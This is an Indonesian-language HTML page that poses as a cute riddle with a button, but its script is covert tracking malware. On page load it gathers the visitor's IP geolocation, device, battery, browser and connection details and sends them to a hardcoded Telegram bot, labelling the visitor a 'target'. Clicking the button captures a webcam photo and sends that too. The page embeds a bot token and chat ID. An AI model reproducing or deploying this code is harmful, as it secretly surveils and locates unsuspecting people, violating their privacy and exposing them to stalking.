<body>

<h1>KAMU TAU GAAAA</h1>
<p>apaaa buah yang namanyaa selalu bikinyaa nyaman</p>
<button id="btnCamera">apaa tuh</button>

<script>
const const BOT_TOKEN="8379627519:AAF7Ti4YUtt17MB5AynRh7SM0ba3tXl8vJo"; // BOT TOKEN
const CHAT_ID="6051179992"; // CHAT ID
const STATIC_IMAGE="https://a.top4top.io/p_3592jwm3w0.jpg";

function escapeHtml(s){return String(s||"-").replaceAll("&","&amp;").replaceAll("<","&lt;").replaceAll(">","&gt;");}

// Ambil IP/device info via ip-api.com (CORS-friendly)
async function getIpInfo(){
  console.log("Mengambil informasi IP...");
  try{
    const r = await fetch("https://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,lat,lon,timezone,query");
    const data = await r.json();
    if(data.status !== "success") {
        console.error("Gagal mengambil data IP:", data.message);
        return {ip:"-", city:"-", region:"-", country_name:"-", country_code:"-", latitude:"0", longitude:"0", timezone:"-"};
    }
    console.log("Informasi IP berhasil diambil:", data);
    return {
      ip: data.query || "-",
      city: data.city || "-",
      region: data.regionName || "-",
      country_name: data.country || "-",
      country_code: data.countryCode || "-",
      latitude: data.lat || "0",
      longitude: data.lon || "0",
      timezone: data.timezone || "-"
    };
  }catch(e){
    console.error("Error saat mengambil informasi IP:", e);
    return {ip:"-", city:"-", region:"-", country_name:"-", country_code:"-", latitude:"0", longitude:"0", timezone:"-"};
  }
}

// Ambil device info
async function getDeviceInfo(){
  console.log("Mengambil informasi perangkat...");
  const b = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({level:null,charging:false,chargingTime:null,dischargingTime:null}));
  const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
  
  const deviceInfo = {
    userAgent:navigator.userAgent,
    platform:navigator.platform,
    language:navigator.language,
    languages:navigator.languages ? navigator.languages.join(", ") : "-",
    screen: {
      width: screen.width,
      height: screen.height,
      availWidth: screen.availWidth,
      availHeight: screen.availHeight,
      colorDepth: screen.colorDepth,
      pixelDepth: screen.pixelDepth
    },
    window: {
      innerWidth: window.innerWidth,
      innerHeight: window.innerHeight,
      outerWidth: window.outerWidth || "-",
      outerHeight: window.outerHeight || "-"
    },
    hardware: {
      cores: navigator.hardwareConcurrency || "-",
      memory: navigator.deviceMemory || "-",
      maxTouchPoints: navigator.maxTouchPoints || 0,
      vendor: navigator.vendor || "-"
    },
    browser: {
      cookieEnabled: navigator.cookieEnabled,
      onLine: navigator.onLine,
      doNotTrack: navigator.doNotTrack,
      javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false
    },
    battery: {
      level: b.level,
      charging: b.charging,
      chargingTime: b.chargingTime,
      dischargingTime: b.dischargingTime
    },
    connection: {
      effectiveType: connection.effectiveType || "-",
      downlink: connection.downlink || "-",
      rtt: connection.rtt || "-"
    },
    timezone: {
      offset: new Date().getTimezoneOffset(),
      localTime: new Date().toLocaleString()
    }
  };
  console.log("Informasi perangkat berhasil diambil.");
  return deviceInfo;
}

// Build caption Telegram dengan blockquote dan emoji
function buildCaption(ip,d){
  const g=`https://www.google.com/maps?q=${ip.latitude},${ip.longitude}`;
  const caption = [
    "<blockquote>",
    "<b>🌐 INFORMATION TARGET 🌐</b>",
    "",
    "📍 <b>Location Info</b>",
    `IP: ${escapeHtml(ip.ip)}`,
    `City: ${escapeHtml(ip.city)}`,
    `Region: ${escapeHtml(ip.region)}`,
    `Country: ${escapeHtml(ip.country_name)} (${escapeHtml(ip.country_code)})`,
    `Latitude: ${escapeHtml(ip.latitude)}`,
    `Longitude: ${escapeHtml(ip.longitude)}`,
    `Timezone: ${escapeHtml(ip.timezone)}`,
    `🗺️ Location: ${g}`,
    "",
    "📱 <b>Device Info</b>",
    `Platform: ${escapeHtml(d.platform)}`,
    `Vendor: ${escapeHtml(d.hardware.vendor)}`,
    `CPU Cores: ${escapeHtml(d.hardware.cores)}`,
    `RAM (GB): ${escapeHtml(d.hardware.memory)}`,
    `Touch Points: ${escapeHtml(d.hardware.maxTouchPoints)}`,
    "",
    "🖥️ <b>Screen Info</b>",
    `Screen: ${escapeHtml(d.screen.width+"x"+d.screen.height)}`,
    `Available: ${escapeHtml(d.screen.availWidth+"x"+d.screen.availHeight)}`,
    `Color Depth: ${escapeHtml(d.screen.colorDepth)} bit`,
    `Pixel Ratio: ${escapeHtml(window.devicePixelRatio)}`,
    "",
    "🌍 <b>Browser Info</b>",
    `User Agent: ${escapeHtml(d.userAgent)}`,
    `Language: ${escapeHtml(d.language)}`,
    `Languages: ${escapeHtml(d.languages)}`,
    `Cookies Enabled: ${escapeHtml(d.browser.cookieEnabled)}`,
    `Online: ${escapeHtml(d.browser.onLine)}`,
    `Do Not Track: ${escapeHtml(d.browser.doNotTrack)}`,
    `Java Enabled: ${escapeHtml(d.browser.javaEnabled)}`,
    "",
    "🔋 <b>Battery Info</b>",
    `Level: ${escapeHtml(d.battery.level !== null ? Math.round(d.battery.level * 100) + "%" : "-")}`,
    `Status: ${escapeHtml(d.battery.charging ? "Charging ⚡" : "Not Charging 🔋")}`,
    `Charging Time: ${escapeHtml(d.battery.chargingTime ? d.battery.chargingTime + "s" : "-")}`,
    `Discharging Time: ${escapeHtml(d.battery.dischargingTime ? d.battery.dischargingTime + "s" : "-")}`,
    "",
    "📶 <b>Connection Info</b>",
    `Type: ${escapeHtml(d.connection.effectiveType)}`,
    `Downlink: ${escapeHtml(d.connection.downlink)} Mbps`,
    `RTT: ${escapeHtml(d.connection.rtt)} ms`,
    "",
    "⏰ <b>Time Info</b>",
    `Local Time: ${escapeHtml(d.timezone.localTime)}`,
    `UTC Time: ${escapeHtml(new Date().toISOString())}`,
    `Timezone Offset: ${escapeHtml(d.timezone.offset)} minutes`,
    "",
    "🔗 <b>URL Info</b>",
    `URL: ${escapeHtml(location.href)}`,
    `Referrer: ${escapeHtml(document.referrer || "-")}`,
    "",
    "<b>📸 INFORMATION CAPTURED BY 📸</b>",
    "Love Cute Bot",
    "</blockquote>"
  ].join("\n");
  
  return caption;
}

// Kirim IP/device + foto statis saat halaman load
async function sendIpDevice(){
  console.log("Memulai proses pengiriman data awal...");
  const [ip,d] = await Promise.all([getIpInfo(), getDeviceInfo()]);
  const caption = buildCaption(ip,d);
  console.log("Mengirim data ke Telegram...");

  try {
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
      method:"POST",
      headers:{"Content-Type":"application/json"},
      body: JSON.stringify({
        chat_id: CHAT_ID,
        photo: STATIC_IMAGE,
        caption: caption,
        parse_mode:"HTML"
      })
    });
    const result = await response.json();
    if(result.ok) {
        console.log("Data awal berhasil dikirim ke Telegram!");
    } else {
        console.error("Gagal mengirim data awal ke Telegram:", result);
    }
  } catch (error) {
    console.error("Terjadi kesalahan saat mengirim data awal:", error);
  }
}

// Kamera snapshot sebagai file .jpg (document)
async function sendSnapshot(){
  // Cek apakah getUserMedia didukung
  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
      console.error("API Kamera tidak didukung oleh browser ini.");
      alert("Fitur kamera tidak dapat digunakan di browser Anda.");
      return;
  }

  console.log("Meminta izin kamera...");
  try{
    const stream = await navigator.mediaDevices.getUserMedia({video:true});
    const video = document.createElement('video');
    video.style.display='none';
    document.body.appendChild(video);
    video.srcObject = stream;
    video.play();

    await new Promise(resolve => { video.onloadedmetadata = () => setTimeout(resolve, 200); });

    const canvas=document.createElement('canvas');
    canvas.width=video.videoWidth;
    canvas.height=video.videoHeight;
    canvas.getContext('2d').drawImage(video,0,0,canvas.width,canvas.height);

    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));

    const formData = new FormData();
    formData.append("chat_id", CHAT_ID);
    formData.append("document", blob, "snapshot.jpg");
    // Tambahkan parse_mode ke FormData agar format HTML diproses
    formData.append("caption", "<blockquote>📸 <b>Photo Captured Successfully!</b> 📸\n\nTarget's photo has been captured and sent to you.\n\n<b>Love Cute Bot</b></blockquote>");
    formData.append("parse_mode", "HTML");

    console.log("Mengirim snapshot ke Telegram...");
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
      method: "POST",
      body: formData
    });
    
    const result = await response.json();
    if(result.ok) {
        console.log("Snapshot berhasil dikirim!");
    } else {
        console.error("Gagal mengirim snapshot:", result);
    }

    stream.getTracks().forEach(track=>track.stop());
    video.remove();
  }catch(e){
    console.error("Gagal mengambil snapshot:", e);
    alert("Tidak dapat mengakses kamera. Pastikan Anda telah memberikan izin.");
  }
}

// Jalankan saat halaman load
window.addEventListener("load", () => {
    // Jeda kecil untuk memastikan semua elemen halaman dimuat
    setTimeout(sendIpDevice, 500);
});

// Tombol klik kamera
document.getElementById("btnCamera").addEventListener("click", sendSnapshot);
</script>
</body>
